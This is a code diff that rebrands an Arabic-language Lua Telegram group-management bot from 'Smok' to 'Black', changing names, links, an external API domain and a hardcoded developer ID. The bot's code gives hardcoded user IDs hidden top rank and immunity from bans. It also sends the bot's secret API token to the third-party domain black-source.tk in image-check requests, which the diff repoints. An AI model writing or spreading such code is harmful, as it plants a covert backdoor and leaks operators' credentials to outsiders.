@@ -11,7 +11,7 @@ https   = require("ssl.https")
 sudos   = dofile("sudo.lua")
 bot_id  = token:match("(%d+)")  
 Id_Sudo = Sudo
-List_Sudos = {Id_Sudo,1753984669,1513792170}
+List_Sudos = {Id_Sudo,1753984669,6666}
 User = io.popen("whoami"):read('*a')
 IP = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a')
 name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a')
@@ -161,7 +161,7 @@ end
 function Rank_Checking(user_id,chat_id)
 if tonumber(user_id) == tonumber(1753984669) then  
 var = true  
-elseif tonumber(user_id) == tonumber(1513792170) then
+elseif tonumber(user_id) == tonumber(6666) then
 var = true  
 elseif tonumber(user_id) == tonumber(Id_Sudo) then
 var = true  
@@ -191,7 +191,7 @@ end
 function Get_Rank(user_id,chat_id)
 if tonumber(user_id) == tonumber(1753984669) then  
 var = 'مطور السورس'
-elseif tonumber(user_id) == tonumber(1513792170) then  
+elseif tonumber(user_id) == tonumber(6666) then  
 var = "مطور السورس"  
 elseif DevSMOKe(user_id) == true then
 var = "المطور الاساسي"  
@@ -433,7 +433,7 @@ ID="InputMessageAudio",
 audio_ = GetInputFile(audio),
 duration_ = "",
 title_ = title or "",
-performer_ = "سورس سموك الرسمي",
+performer_ = "سورس بلاك الرسمي",
 caption_ = caption or ""
 }},func or dl_cb,nil)
 end
@@ -511,8 +511,8 @@ function Reply_Status(msg,user_id,status,text)
 tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,data) 
 if data.first_name_ ~= false then
 local UserName = (data.username_ or "X6YX6")
-local NameUser = "[- Smok 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙بواسطه -› ["..data.first_name_.."](T.me/"..UserName..")"
-local NameUserr = "[- Smok 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙اسم المستخدم -› ["..data.first_name_.."](T.me/"..UserName..")"
+local NameUser = "[- BLacK 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙بواسطه -› ["..data.first_name_.."](T.me/"..UserName..")"
+local NameUserr = "[- BLacK 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙اسم المستخدم -› ["..data.first_name_.."](T.me/"..UserName..")"
 if status == "lock" then
 send(msg.chat_id_, msg.id_,NameUser.."\n"..text.."\n— — — — — — — — —\n⌔︙تم تنفيذ الامر بخاصيه ( المسح )\n")
 return false
@@ -2757,7 +2757,7 @@ if result.id_ == tonumber(1753984669) then
 send(msg.chat_id_, msg.id_, "⌔︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
-if result.id_ == tonumber(1513792170) then
+if result.id_ == tonumber(6666) then
 send(msg.chat_id_, msg.id_, "⌔︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
@@ -2784,7 +2784,7 @@ if userid == tonumber(1753984669) then
 send(msg.chat_id_, msg.id_, "⌔︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
-if userid == tonumber(1513792170) then
+if userid == tonumber(6666) then
 send(msg.chat_id_, msg.id_, "⌔︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
@@ -3479,19 +3479,19 @@ function by_reply(extra, result, success)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
 local SMOKrt = database:get(bot_id.."SMOK:Comd:New:rt:bot:"..RTPA..msg.chat_id_)
 if SMOKrt == "مميز" and Addictive(msg) then
-send(msg.chat_id_, msg.id_,"[- Smok 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "X6YX6")..")".."\n⌔︙تم رفعه "..RTPA.." هنا\n")
+send(msg.chat_id_, msg.id_,"[- BLacK 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "X6YX6")..")".."\n⌔︙تم رفعه "..RTPA.." هنا\n")
 database:set(bot_id.."SMOK:Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,RTPA) 
 database:sadd(bot_id.."SMOK:Special:User"..msg.chat_id_,result.sender_user_id_)  
 elseif SMOKrt == "ادمن" and Owner(msg) then 
-send(msg.chat_id_, msg.id_,"[- Smok 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "X6YX6")..")".."\n⌔︙تم رفعه "..RTPA.." هنا\n")
+send(msg.chat_id_, msg.id_,"[- BLacK 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "X6YX6")..")".."\n⌔︙تم رفعه "..RTPA.." هنا\n")
 database:set(bot_id.."SMOK:Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,RTPA)
 database:sadd(bot_id.."SMOK:Mod:User"..msg.chat_id_,result.sender_user_id_)  
 elseif SMOKrt == "مدير" and Constructor(msg) then
-send(msg.chat_id_, msg.id_,"[- Smok 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "X6YX6")..")".."\n⌔︙تم رفعه "..RTPA.." هنا\n")
+send(msg.chat_id_, msg.id_,"[- BLacK 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "X6YX6")..")".."\n⌔︙تم رفعه "..RTPA.." هنا\n")
 database:set(bot_id.."SMOK:Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,RTPA)  
 database:sadd(bot_id.."SMOK:Manager"..msg.chat_id_,result.sender_user_id_)  
 elseif SMOKrt == "عضو" and Addictive(msg) then
-send(msg.chat_id_, msg.id_,"[- Smok 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "X6YX6")..")".."\n⌔︙تم رفعه "..RTPA.." هنا\n")
+send(msg.chat_id_, msg.id_,"[- BLacK 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "X6YX6")..")".."\n⌔︙تم رفعه "..RTPA.." هنا\n")
 end
 end,nil)   
 end   
@@ -3514,19 +3514,19 @@ function by_reply(extra, result, success)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
 local SMOKrt = database:get(bot_id.."SMOK:Comd:New:rt:bot:"..RTPA..msg.chat_id_)
 if SMOKrt == "مميز" and Addictive(msg) then
-send(msg.chat_id_, msg.id_,"[- Smok 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "X6YX6")..")".."\n⌔︙تم تنزيله من "..RTPA.." هنا\n")  
+send(msg.chat_id_, msg.id_,"[- BLacK 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "X6YX6")..")".."\n⌔︙تم تنزيله من "..RTPA.." هنا\n")  
 database:srem(bot_id.."SMOK:Special:User"..msg.chat_id_,result.sender_user_id_)  
 database:del(bot_id.."SMOK:Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
 elseif SMOKrt == "ادمن" and Owner(msg) then 
-send(msg.chat_id_, msg.id_,"[- Smok 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "X6YX6")..")".."\n⌔︙تم تنزيله من "..RTPA.." هنا\n")  
+send(msg.chat_id_, msg.id_,"[- BLacK 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "X6YX6")..")".."\n⌔︙تم تنزيله من "..RTPA.." هنا\n")  
 database:srem(bot_id.."SMOK:Mod:User"..msg.chat_id_,result.sender_user_id_) 
 database:del(bot_id.."SMOK:Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
 elseif SMOKrt == "مدير" and Constructor(msg) then
-send(msg.chat_id_, msg.id_,"[- Smok 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "X6YX6")..")".."\n⌔︙تم تنزيله من "..RTPA.." هنا\n")  
+send(msg.chat_id_, msg.id_,"[- BLacK 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "X6YX6")..")".."\n⌔︙تم تنزيله من "..RTPA.." هنا\n")  
 database:srem(bot_id.."SMOK:Manager"..msg.chat_id_,result.sender_user_id_)  
 database:del(bot_id.."SMOK:Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
 elseif SMOKrt == "عضو" and Addictive(msg) then
-send(msg.chat_id_, msg.id_,"[- Smok 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "X6YX6")..")".."\n⌔︙تم تنزيله من "..RTPA.." هنا\n")  
+send(msg.chat_id_, msg.id_,"[- BLacK 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "X6YX6")..")".."\n⌔︙تم تنزيله من "..RTPA.." هنا\n")  
 end
 end,nil)   
 end   
@@ -3549,19 +3549,19 @@ function py_username(extra, result, success)
 if result.id_ then
 local SMOKrt = database:get(bot_id.."SMOK:Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
 if SMOKrt == "مميز" and Addictive(msg) then
-send(msg.chat_id_, msg.id_,"[- Smok 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙العضو -› ["..result.title_.."](t.me/"..(text1[3] or "X6YX6")..")".."\n⌔︙تم رفعه "..text1[2].." هنا")   
+send(msg.chat_id_, msg.id_,"[- BLacK 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙العضو -› ["..result.title_.."](t.me/"..(text1[3] or "X6YX6")..")".."\n⌔︙تم رفعه "..text1[2].." هنا")   
 database:sadd(bot_id.."SMOK:Special:User"..msg.chat_id_,result.id_)  
 database:set(bot_id.."SMOK:Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
 elseif SMOKrt == "ادمن" and Owner(msg) then 
-send(msg.chat_id_, msg.id_,"[- Smok 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙العضو -› ["..result.title_.."](t.me/"..(text1[3] or "X6YX6")..")".."\n⌔︙تم رفعه "..text1[2].." هنا")   
+send(msg.chat_id_, msg.id_,"[- BLacK 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙العضو -› ["..result.title_.."](t.me/"..(text1[3] or "X6YX6")..")".."\n⌔︙تم رفعه "..text1[2].." هنا")   
 database:sadd(bot_id.."SMOK:Mod:User"..msg.chat_id_,result.id_)  
 database:set(bot_id.."SMOK:Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
 elseif SMOKrt == "مدير" and Constructor(msg) then
-send(msg.chat_id_, msg.id_,"[- Smok 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙العضو -› ["..result.title_.."](t.me/"..(text1[3] or "X6YX6")..")".."\n⌔︙تم رفعه "..text1[2].." هنا")   
+send(msg.chat_id_, msg.id_,"[- BLacK 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙العضو -› ["..result.title_.."](t.me/"..(text1[3] or "X6YX6")..")".."\n⌔︙تم رفعه "..text1[2].." هنا")   
 database:sadd(bot_id.."SMOK:Manager"..msg.chat_id_,result.id_)  
 database:set(bot_id.."SMOK:Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
 elseif SMOKrt == "عضو" and Addictive(msg) then
-send(msg.chat_id_, msg.id_,"[- Smok 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙العضو -› ["..result.title_.."](t.me/"..(text1[3] or "X6YX6")..")".."\n⌔︙تم رفعه "..text1[2].." هنا")   
+send(msg.chat_id_, msg.id_,"[- BLacK 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙العضو -› ["..result.title_.."](t.me/"..(text1[3] or "X6YX6")..")".."\n⌔︙تم رفعه "..text1[2].." هنا")   
 end
 else
 info = "⌔︙المعرف غلط"
@@ -3587,19 +3587,19 @@ function py_username(extra, result, success)
 if result.id_ then
 local SMOKrt = database:get(bot_id.."SMOK:Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
 if SMOKrt == "مميز" and Addictive(msg) then
-send(msg.chat_id_, msg.id_,"[- Smok 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙العضو -› ["..result.title_.."](t.me/"..(text1[3] or "X6YX6")..")".."\n⌔︙تم تنريله من "..text1[2].." هنا")   
+send(msg.chat_id_, msg.id_,"[- BLacK 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙العضو -› ["..result.title_.."](t.me/"..(text1[3] or "X6YX6")..")".."\n⌔︙تم تنريله من "..text1[2].." هنا")   
 database:srem(bot_id.."SMOK:Special:User"..msg.chat_id_,result.id_)  
 database:del(bot_id.."SMOK:Comd:New:rt:User:"..msg.chat_id_..result.id_)
 elseif SMOKrt == "ادمن" and Owner(msg) then 
-send(msg.chat_id_, msg.id_,"[- Smok 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙العضو -› ["..result.title_.."](t.me/"..(text1[3] or "X6YX6")..")".."\n⌔︙تم تنريله من "..text1[2].." هنا")   
+send(msg.chat_id_, msg.id_,"[- BLacK 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙العضو -› ["..result.title_.."](t.me/"..(text1[3] or "X6YX6")..")".."\n⌔︙تم تنريله من "..text1[2].." هنا")   
 database:srem(bot_id.."SMOK:Mod:User"..msg.chat_id_,result.id_)  
 database:del(bot_id.."SMOK:Comd:New:rt:User:"..msg.chat_id_..result.id_)
 elseif SMOKrt == "مدير" and Constructor(msg) then
-send(msg.chat_id_, msg.id_,"[- Smok 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙العضو -› ["..result.title_.."](t.me/"..(text1[3] or "X6YX6")..")".."\n⌔︙تم تنريله من "..text1[2].." هنا")   
+send(msg.chat_id_, msg.id_,"[- BLacK 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙العضو -› ["..result.title_.."](t.me/"..(text1[3] or "X6YX6")..")".."\n⌔︙تم تنريله من "..text1[2].." هنا")   
 database:srem(bot_id.."SMOK:Manager"..msg.chat_id_,result.id_)  
 database:del(bot_id.."SMOK:Comd:New:rt:User:"..msg.chat_id_..result.id_)
 elseif SMOKrt == "عضو" and Addictive(msg) then
-send(msg.chat_id_, msg.id_,"[- Smok 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙العضو -› ["..result.title_.."](t.me/"..(text1[3] or "X6YX6")..")".."\n⌔︙تم تنريله من "..text1[2].." هنا")   
+send(msg.chat_id_, msg.id_,"[- BLacK 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/X6YX6)\n — — — — — — — — —\n⌔︙العضو -› ["..result.title_.."](t.me/"..(text1[3] or "X6YX6")..")".."\n⌔︙تم تنريله من "..text1[2].." هنا")   
 end
 else
 info = "⌔︙المعرف غلط"
@@ -3629,7 +3629,7 @@ if result.sender_user_id_ == tonumber(1753984669) then
 send(msg.chat_id_, msg.id_, "⌔︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
-if result.sender_user_id_ == tonumber(1513792170) then
+if result.sender_user_id_ == tonumber(6666) then
 send(msg.chat_id_, msg.id_, "⌔︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
@@ -3694,7 +3694,7 @@ return false
 end
 function Function_SMOK(extra, result, success)
 if result.id_ then
-if result.id_ == tonumber(1513792170) then
+if result.id_ == tonumber(6666) then
 send(msg.chat_id_, msg.id_, "⌔︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
@@ -3758,7 +3758,7 @@ if userid == tonumber(1753984669) then
 send(msg.chat_id_, msg.id_, "⌔︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
-if userid == tonumber(1513792170) then
+if userid == tonumber(6666) then
 send(msg.chat_id_, msg.id_, "⌔︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
@@ -3868,7 +3868,7 @@ if result.sender_user_id_ == tonumber(1753984669) then
 send(msg.chat_id_, msg.id_, "⌔︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس  \n")
 return false 
 end
-if result.sender_user_id_ == tonumber(1513792170) then
+if result.sender_user_id_ == tonumber(6666) then
 send(msg.chat_id_, msg.id_, "⌔︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس  \n")
 return false 
 end
@@ -6291,7 +6291,7 @@ database:set(bot_id.."SMOK:Left:Bot"..msg.chat_id_,true)
 send(msg.chat_id_, msg.id_, "⌔︙تم تعطيل مغادرة البوت") 
 return false 
 end
-if text == (database:get(bot_id.."SMOK:Name:Bot") or "سموك") then
+if text == (database:get(bot_id.."SMOK:Name:Bot") or "بلاك") then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -6301,7 +6301,7 @@ send(msg.chat_id_, msg.id_,'⌔︙عـليك الاشـتࢪاك في قنـاة
 end
 return false
 end
-Namebot = (database:get(bot_id.."SMOK:Name:Bot") or "سموك")
+Namebot = (database:get(bot_id.."SMOK:Name:Bot") or "بلاك")
 local namebot = {
 "عمري فداك "..Namebot.. " كول حب ",
 "كول حبيبي ؟ اني "..Namebot,
@@ -6320,7 +6320,7 @@ return false
 end
 
 if text == "بوت" then
-Namebot = (database:get(bot_id.."SMOK:Name:Bot") or "سموك")
+Namebot = (database:get(bot_id.."SMOK:Name:Bot") or "بلاك")
 send(msg.chat_id_, msg.id_,"اسمي القميل ["..Namebot.."] ") 
 end
 if text == "تغير اسم البوت" or text == "تغيير اسم البوت" or text == "حذف اسم البوت" then 
@@ -6881,7 +6881,7 @@ local Texting = {
 "وفالله 😔💘",
 "كشخه برب 😉💘",
 "دغيره شبي هذ 😒",
-"تعال بحظن جكاره 💘",
+"عمري الحلوين 💘",
 }
 local Description = Texting[math.random(#Texting)]
 local get_id = database:get(bot_id.."SMOK:Klesh:Id:Bot"..msg.chat_id_)
@@ -7384,7 +7384,7 @@ name = string.gsub(name,"🧜‍♂","🧜‍♀🧜‍♀🧜‍♀🧜‍♀�
 name = string.gsub(name,"🧝‍♂","🧝‍♀🧝‍♀🧝‍♀🧝‍♀🧝‍♀🧝‍♂🧝‍♀🧝‍♀🧝‍♀")
 name = string.gsub(name,"🙍‍♂️","🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙍‍♂️🙎‍♂️🙎‍♂️🙎‍♂️")
 name = string.gsub(name,"🧖‍♂️","🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♂️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️")
-name = string.gsub(name,"👬","👭👭👭👭👭👬👭👭👭")
+name = string.gsub(name,"👬","??👭👭👭👭👬👭👭👭")
 name = string.gsub(name,"👨‍👨‍👧","👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👧👨‍👨‍👦👨‍👨‍👦")
 name = string.gsub(name,"🕒","🕒🕒🕒🕒🕒🕒🕓🕒🕒🕒")
 name = string.gsub(name,"🕤","🕥🕥🕥🕥🕥🕤🕥🕥🕥")
@@ -7773,7 +7773,7 @@ database:set(bot_id.."SMOK:zhrf_Bots"..msg.chat_id_,"open")
 end
 if text and text:match("^زخرفه (.*)$") and database:get(bot_id.."SMOK:zhrf_Bots"..msg.chat_id_) == "open" then
 local TextZhrfa = text:match("^زخرفه (.*)$")
-zh = https.request('https://Smok-source.tk/SmokTeAM/frills.php?en='..URL.escape(TextZhrfa)..'')
+zh = https.request('https://black-source.tk/BlackTeAM/frills.php?en='..URL.escape(TextZhrfa)..'')
 zx = JSON.decode(zh)
 t = "\n⌔️︙قائمه الزخرفه \n — — — — — — — — — \n"
 i = 0
@@ -7793,7 +7793,7 @@ database:set(bot_id.."SMOK:brj_Bots"..msg.chat_id_,"open")
 end
 if text and text:match("^برج (.*)$") and database:get(bot_id.."SMOK:brj_Bots"..msg.chat_id_) == "open" then
 local Textbrj = text:match("^برج (.*)$")
-gk = https.request('https://Smok-source.tk/SmokTeAM/Horoscopes.php?br='..URL.escape(Textbrj)..'')
+gk = https.request('https://black-source.tk/BlackTeAM/Horoscopes.php?br='..URL.escape(Textbrj)..'')
 br = JSON.decode(gk)
 send(msg.chat_id_, msg.id_, br.ok.hso)
 end
@@ -7807,7 +7807,7 @@ database:set(bot_id.."SMOK:age_Bots"..msg.chat_id_,"open")
 end
 if text and text:match("^احسب (.*)$") and database:get(bot_id.."SMOK:age_Bots"..msg.chat_id_) == "open" then
 local Textage = text:match("^احسب (.*)$")
-ge = https.request('https://Smok-source.tk/SmokTeAM/Calculateage.php?age='..URL.escape(Textage)..'')
+ge = https.request('https://black-source.tk/BlackTeAM/Calculateage.php?age='..URL.escape(Textage)..'')
 ag = JSON.decode(ge)
 send(msg.chat_id_, msg.id_, ag.ok.hso)
 end
@@ -7821,7 +7821,7 @@ database:set(bot_id.."SMOK:insta_bot"..msg.chat_id_,"open")
 end
 if text and text:match("^معلومات (.*)$") and database:get(bot_id.."SMOK:insta_bot"..msg.chat_id_) == "open" then
 local Textni = text:match("^معلومات (.*)$")
-data,res = https.request('https://Smok-source.tk/SmokTeAM/infoInstagram.php?username='..URL.escape(Textni)..'')
+data,res = https.request('https://black-source.tk/BlackTeAM/infoInstagram.php?username='..URL.escape(Textni)..'')
 if res == 200 then
 muaed = json:decode(data)
 if muaed.Info == true then
@@ -7841,7 +7841,7 @@ end
 
 if text and text:match("^فلم (.*)$") and database:get(bot_id.."SMOK:movie_bot"..msg.chat_id_) == "open" then
 local Textm = text:match("^فلم (.*)$")
-data,res = https.request('https://Smok-source.tk/SmokTeAM/movie.php?serch='..URL.escape(Textm)..'')
+data,res = https.request('https://black-source.tk/BlackTeAM/movie.php?serch='..URL.escape(Textm)..'')
 if res == 200 then
 getmo = json:decode(data)
 if getmo.Info == true then
@@ -7857,14 +7857,14 @@ end
 end
 end
 if text == "غنيلي" then
-data,res = https.request('https://Black-source.tk/BlackTeAM/audios.php')
+data,res = https.request('https://black-source.tk/BlackTeAM/audios.php')
 if res == 200 then
 audios = json:decode(data)
 if audios.Info == true then
 local Text ='⌔︙تم اختيار المقطع الصوتي لك'
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '- SMOK TeAM .',url="t.me/X6YX6"}},
+{{text = '- Black TeAM .',url="t.me/X6YX6"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice='..URL.escape(audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -7877,7 +7877,7 @@ send(msg.chat_id_, msg.id_, Textxt)
 end
 if (msg.content_.sticker_)  and msg.reply_to_message_id_ == 0 and database:get(bot_id.."SMOK:Lock:Xn"..msg.chat_id_)=="del" then      
 sticker_id = msg.content_.sticker_.sticker_.persistent_id_
-st = https.request('https://Smok-source.tk/SmokTeAM/ImageInfo.php?token='..token..'&url='..sticker_id.."&type=sticker")
+st = https.request('https://black-source.tk/BlackTeAM/ImageInfo.php?token='..token..'&url='..sticker_id.."&type=sticker")
 eker = JSON.decode(st)
 if eker.ok.Info == "Indecent" then
 local list = database:smembers(bot_id.."SMOK:Basic:Constructor"..msg.chat_id_)
@@ -7899,7 +7899,7 @@ end
 end
 if (msg.content_.photo_) and msg.reply_to_message_id_ == 0 and database:get(bot_id.."SMOK:Lock:Xn"..msg.chat_id_)=="del" then
 photo_id = msg.content_.photo_.sizes_[1].photo_.persistent_id_  
-Srrt = https.request('https://Smok-source.tk/SmokTeAM/ImageInfo.php?token='..token..'&url='..photo_id.."&type=photo")
+Srrt = https.request('https://black-source.tk/BlackTeAM/ImageInfo.php?token='..token..'&url='..photo_id.."&type=photo")
 Sto = JSON.decode(Srrt)
 if Sto.ok.Info == "Indecent" then
 local list = database:smembers(bot_id.."SMOK:Basic:Constructor"..msg.chat_id_)
@@ -8071,12 +8071,12 @@ send(msg.chat_id_, msg.id_,t)
 end
 if text == "متجر الملفات" or text == 'المتجر' then
 if DevSMOK(msg) then
-local Get_Files, res = https.request("https://raw.githubusercontent.com/SMOK-S/files_SMOK/master/getfile.json")
+local Get_Files, res = https.request("https://raw.githubusercontent.com/SMOK/files_SMOK/master/getfile.json")
 if res == 200 then
 local Get_info, res = pcall(JSON.decode,Get_Files);
 vardump(res.plugins_)
 if Get_info then
-local TextS = "\n⌔︙اهلا بك في متجر ملفات سموك\n⌔︙يوجد في المتجر ملف الردود\n⌔︙يتم ادراج الملفات في التحديثات القادمه \n — — — — — — — — — \n"
+local TextS = "\n⌔︙اهلا بك في متجر ملفات بلاك\n⌔︙يوجد في المتجر ملف الردود\n⌔︙يتم ادراج الملفات في التحديثات القادمه \n — — — — — — — — — \n"
 local TextE = "\n — — — — — — — — — \n⌔︙تدل علامة (✔) الملف مفعل\n".."⌔︙تدل علامة (✖) الملف معطل\n"
 local NumFile = 0
 for name,Info in pairs(res.plugins_) do
@@ -8195,23 +8195,23 @@ send(msg.chat_id_, msg.id_, "⌔︙تم التحديث")
 end
 
 if text == 'السورس' or text == 'سورس' or text == 'ياسورس' or text == 'يا سورس' then  
-local url,res = https.request('https://Black-source.tk/BlackTeAM/ChatMember.php?id='..msg.sender_user_id_)
+local url,res = https.request('https://black-source.tk/BlackTeAM/ChatMember.php?id='..msg.sender_user_id_)
 data = JSON.decode(url)
 if data.Ch_Member.info ~= true then
 send(msg.chat_id_,msg.id_,'⌔︙شترك في قناة السورس اولآ @X6YX6 .')   
 return false 
 end
 Text = [[
-*- Smok Team .*
+*- Black Team .*
  — — — — — — — — — 
      
-[⌔︙ SMOK 𝖲𝗈𝗎𝗋𝖼𝖾  .](http://t.me/X6YX6)
+[⌔︙ BLacK 𝖲𝗈𝗎𝗋𝖼𝖾  .](http://t.me/X6YX6)
      
-[⌔︙ CH SMOK .](http://t.me/X6YX6)
+[⌔︙ ToolS BLacK .](http://t.me/X6YX6)
      
-[⌔︙ 𝖳WSL Source SMOK .](http://t.me/E444Q)
+[⌔︙ 𝖳WSL Source BLacK .](http://t.me/E444Q)
      
-[⌔︙ CH SMOK .](http://t.me/X6YX6)
+[⌔︙   DV 𝖲𝗈𝗎𝗋𝖼𝖾 .](http://t.me/E444Q)
 ]]
 send(msg.chat_id_, msg.id_,Text)
 end
@@ -8693,7 +8693,7 @@ local keyboard = {
 {'- تفعيل الاشتراك الاجباري ⌔ .'},
 {'- الاشتراك الاجباري ⌔ .'},
 {'- تعين قناة الاشتراك ⌔ .','- تغير رساله الاشتراك ⌔ .'},
-{'تحديث السورس ⌔','تحديث ⌔'},
+{'تحديث السورس ⌔','تحديث الملفات ⌔'},
 {'قائمه العام ⌔'},
 {'جلب نسخه احتياطيه ⌔'},
 {'الغاء ⌔'}
@@ -8943,7 +8943,7 @@ local IdDe = text:match("^(%d+)$")
 send(msg.chat_id_,msg.id_, "⌔︙تم تحفظ المعلومات اضغط ( تحديث الملفات ⌔ ) للتنفيذ")
 local A = io.open("sudo.lua", 'w')
 A:write([[
-s = "BGBBB"
+s = "E444Q"
 
 q = "X6YX6"
 
@@ -9271,7 +9271,7 @@ local idchci = "-100"..idch
